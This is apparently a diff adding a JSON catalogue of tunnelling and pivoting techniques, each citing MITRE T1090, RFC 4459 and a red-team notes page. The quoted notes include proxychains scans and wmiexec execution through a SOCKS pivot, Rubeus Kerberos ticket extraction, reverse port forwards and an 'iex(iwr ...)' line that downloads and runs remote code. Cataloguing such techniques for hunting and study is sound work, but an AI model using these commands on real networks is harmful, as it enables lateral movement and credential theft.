@@ -1,0 +1,138 @@
+{
+ "class_id": "tunneling_pivoting",
+ "items": [
+  {
+   "item_key": "tunneling_pivoting.technique.tested_page_159098c3_95c5_809e_af81_c66c0",
+   "kind": "technique",
+   "claim": "A SOCKS5 listener on the foothold plus a proxychains entry turns ordinary TCP tools into internal scanners, so pivot reachability is proven by scanning internal hosts and ports through the proxy.",
+   "body": "A SOCKS5 listener on the foothold plus a proxychains entry turns ordinary TCP tools into internal scanners, so pivot reachability is proven by scanning internal hosts and ports through the proxy.\n\nHackTricks reference: 159098c3 (notion:159098c3-95c5-809e-af81-c66c0f07c2a1)",
+   "disproof": "Connections to internal hosts routed through the SOCKS listener time out, or the proxychain configuration points at the wrong port so no internal port ever answers.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://tested-corleggy-562.notion.site/?pvs=4#159098c3-95c5-809e-af81-c66c0f07c2a1",
+     "source_type": "reference",
+     "host": "tested-corleggy-562.notion.site",
+     "publisher": "source-guide",
+     "quote": "page 159098c3-95c5-809e-af81-c66c0f07c2a1\n\nyellowhbSOCKS Proxies\n\nFirst let\u2019 create a SOCKS 5 Listener.\n\nsocks 1080 socks5 disableNoAuth remo remo enableLogging\n\nimage.png\n\nNow let\u2019s check if we are listening or not.\n\nss -alntp | grep -i 1080\n\nimage.png\n\nyellowhProxychains\n\nNow let\u2019s configure the Proxychains file.\n\nsudo vim /etc/proxychains.conf\n\nimage.png\n\nNow let\u2019s test if it\u2019s working.\n\nproxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10\n\nimage.png\n\nAs we see it\u2019s working."
+    },
+    {
+     "url": "https://attack.mitre.org/techniques/T1090/",
+     "source_type": "research",
+     "host": "attack.mitre.org",
+     "publisher": "mitre.org",
+     "quote": "a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN , ZXProxy, and ZXPortMap. [1] Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound"
+    },
+    {
+     "url": "https://www.rfc-editor.org/rfc/rfc4459.html",
+     "source_type": "research",
+     "host": "www.rfc-editor.org",
+     "publisher": "rfc-editor.org",
+     "quote": "It is also common to run multiple layers of encapsulation, for example, GRE or L2TP over IPsec; with nested tunnels in the network, the tunnel endpoints can be the same or different, and both the inner and outer tunnels may have different MTU handling strategies."
+    },
+    {
+     "url": "https://www.rfc-editor.org/rfc/rfc4459.html",
+     "source_type": "research",
+     "host": "rfc-editor.org",
+     "publisher": "rfc-editor.org",
+     "quote": "It is also common to run multiple layers of encapsulation, for example, GRE or L2TP over IPsec; with nested tunnels in the network, the tunnel endpoints can be the same or different, and both the inner and outer tunnels may have different MTU handling strategies."
+    }
+   ]
+  },
+  {
+   "item_key": "tunneling_pivoting.technique.tested_now_let_s_tryit_with_impacket_tool",
+   "kind": "technique",
+   "claim": "The same SOCKS proxy that carries a port scan also carries authenticated remote-execution clients, so a pivot can be used for command execution on internal hosts and not merely for connectivity.",
+   "body": "The same SOCKS proxy that carries a port scan also carries authenticated remote-execution clients, so a pivot can be used for command execution on internal hosts and not merely for connectivity.\n\nHackTricks reference: 159098c3 (notion:159098c3-95c5-809e-af81-c66c0f07c2a1)",
+   "disproof": "The remote-execution call through the proxy is refused or times out even though a scan through the same proxy and port succeeds.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://tested-corleggy-562.notion.site/?pvs=4#159098c3-95c5-809e-af81-c66c0f07c2a1",
+     "source_type": "reference",
+     "host": "tested-corleggy-562.notion.site",
+     "publisher": "source-guide",
+     "quote": "Now let\u2019s tryit with Impacket Toolkit.\n\nproxychains wmiexec.py DEV/jking@10.10.122.30\n\nimage.png\n\nAnd it\u2019s working.\n\nyellowhWindows Tools\n\nFirst open proxifier.\n\nimage.png\n\nNow let\u2019s add the proxy server.\n\nimage.png\n\nnow let\u2019s save it."
+    },
+    {
+     "url": "https://attack.mitre.org/techniques/T1090/",
+     "source_type": "research",
+     "host": "attack.mitre.org",
+     "publisher": "mitre.org",
+     "quote": "a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN , ZXProxy, and ZXPortMap. [1] Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound"
+    },
+    {
+     "url": "https://www.rfc-editor.org/rfc/rfc4459.html",
+     "source_type": "research",
+     "host": "www.rfc-editor.org",
+     "publisher": "rfc-editor.org",
+     "quote": "It is also common to run multiple layers of encapsulation, for example, GRE or L2TP over IPsec; with nested tunnels in the network, the tunnel endpoints can be the same or different, and both the inner and outer tunnels may have different MTU handling strategies."
+    },
+    {
+     "url": "https://www.rfc-editor.org/rfc/rfc4459.html",
+     "source_type": "research",
+     "host": "rfc-editor.org",
+     "publisher": "rfc-editor.org",
+     "quote": "It is also common to run multiple layers of encapsulation, for example, GRE or L2TP over IPsec; with nested tunnels in the network, the tunnel endpoints can be the same or different, and both the inner and outer tunnels may have different MTU handling strategies."
+    }
+   ]
+  },
+  {
+   "item_key": "tunneling_pivoting.technique.tested_first_let_get_the_tgt_execute_a",
+   "kind": "technique",
+   "claim": "A reverse port forward opened on the pivot makes a listening port on the attacker's own machine reachable from the internal host, so the internal host can be induced to send traffic back out through the attacker.",
+   "body": "A reverse port forward opened on the pivot makes a listening port on the attacker's own machine reachable from the internal host, so the internal host can be induced to send traffic back out through the attacker.\n\nHackTricks reference: 159098c3 (notion:159098c3-95c5-809e-af81-c66c0f07c2a1)",
+   "disproof": "No listener appears on the forwarded port on the attacker machine, or the internal host's request to it never shows up in the attacker's session or logs.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://tested-corleggy-562.notion.site/?pvs=4#159098c3-95c5-809e-af81-c66c0f07c2a1",
+     "source_type": "reference",
+     "host": "tested-corleggy-562.notion.site",
+     "publisher": "source-guide",
+     "quote": "First let\u2019 get the TGT.\n\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe tgtdeleg /nowrap\n\nimage.png\n\nNow let\u2019s copy it to Kirbi file.\n\necho -en 'doIFzj[...snip...]MuSU8=' | base64 -d > bfarmer.kirbi\n\nimage.png\n\nNow let\u2019s convert it to ccache.\n\nticketConverter.py bfarmer.kirbi bfarmer.ccache\n\nimage.png\n\nNow let\u2019s use impacket.\n\nyellowhbBrowsers\n\nNow let\u2019s try browser pivoting.\n\nimage.png\n\nNow let\u2019s try to navigate to any internal website.\n\nimage.png\n\nand this works.\n\nyellowhReverse Port Forwards\n\nLet\u2019s try to connect to our team server.\n\niex(iwr http://10.10.5.50/test)\n\nimage.png\n\nNow let\u2019s do reverse port forward\n\nrportfwd 8080 127.0.0.1 80\n\nimage.png\n\nNow let\u2019s check if port 8080 is opened in the attacker machine.\n\nrun netstat -anp tcp\n\nimage.png\n\nNow let\u2019s try to make a connection again\n\niwr -Uri http://wkstn-2:8080/a\n\nimage.png\n\nas we see that traffic was forwarded to us on the team server."
+    },
+    {
+     "url": "https://attack.mitre.org/techniques/T1090/",
+     "source_type": "research",
+     "host": "attack.mitre.org",
+     "publisher": "mitre.org",
+     "quote": "a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN , ZXProxy, and ZXPortMap. [1] Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound"
+    },
+    {
+     "url": "https://www.rfc-editor.org/rfc/rfc4459.html",
+     "source_type": "research",
+     "host": "www.rfc-editor.org",
+     "publisher": "rfc-editor.org",
+     "quote": "It is also common to run multiple layers of encapsulation, for example, GRE or L2TP over IPsec; with nested tunnels in the network, the tunnel endpoints can be the same or different, and both the inner and outer tunnels may have different MTU handling strategies."
+    },
+    {
+     "url": "https://www.rfc-editor.org/rfc/rfc4459.html",
+     "source_type": "research",
+     "host": "rfc-editor.org",
+     "publisher": "rfc-editor.org",
+     "quote": "It is also common to run multiple layers of encapsulation, for example, GRE or L2TP over IPsec; with nested tunnels in the network, the tunnel endpoints can be the same or different, and both the inner and outer tunnels may have different MTU handling strategies."
+    }
+   ]
+  }
+ ],
+ "publishers": [
+  "mitre.org",
+  "rfc-editor.org",
+  "source-guide"
+ ],
+ "sources": [
+  "https://tested-corleggy-562.notion.site/?pvs=4#159098c3-95c5-809e-af81-c66c0f07c2a1",
+  "https://attack.mitre.org/techniques/T1090/",
+  "https://www.rfc-editor.org/rfc/rfc4459.html",
+  "https://www.rfc-editor.org/rfc/rfc4459.html",
+  "https://tested-corleggy-562.notion.site/?pvs=4#159098c3-95c5-809e-af81-c66c0f07c2a1",
+  "https://attack.mitre.org/techniques/T1090/",
+  "https://www.rfc-editor.org/rfc/rfc4459.html",
+  "https://www.rfc-editor.org/rfc/rfc4459.html",
+  "https://tested-corleggy-562.notion.site/?pvs=4#159098c3-95c5-809e-af81-c66c0f07c2a1",
+  "https://attack.mitre.org/techniques/T1090/",
+  "https://www.rfc-editor.org/rfc/rfc4459.html",
+  "https://www.rfc-editor.org/rfc/rfc4459.html"
+ ]
+}
